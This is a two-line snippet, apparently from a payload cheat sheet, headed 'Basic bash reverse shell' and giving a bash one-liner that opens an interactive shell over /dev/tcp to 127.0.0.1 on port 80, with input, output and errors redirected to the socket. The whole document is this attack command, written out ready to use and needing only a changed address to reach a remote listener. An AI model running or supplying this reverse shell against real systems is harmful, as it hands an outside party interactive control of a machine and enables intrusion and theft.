#Basic bash reverse shell
bash -i 5<>/dev/tcp/127.0.0.1/80 1>&5 2>&5 0>&5
